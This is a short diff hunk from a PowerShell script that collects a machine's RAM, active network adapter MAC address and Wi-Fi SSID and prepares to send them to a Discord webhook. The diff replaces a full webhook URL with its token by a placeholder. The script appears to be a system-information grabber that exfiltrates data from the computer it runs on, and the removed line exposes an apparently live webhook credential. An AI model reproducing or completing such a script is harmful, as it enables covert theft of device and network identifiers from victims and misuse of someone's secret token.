@@ -15,7 +15,7 @@ $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory 
 $mac = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
 $ssid = (netsh wlan show interfaces) -match 'SSID' | Select-Object -First 1
 
-$webhookUrl = "https://discord.com/api/webhooks/1393710176049303582/Q48gWu3VqznaGkZ2R32KTdQmrX8WxoFaKve9L6XiPQBvFGtCYtwShx76eutG17unxx3y"
+$webhookUrl = " WEBHOOK URL "
 
 $output = @{
     content = 
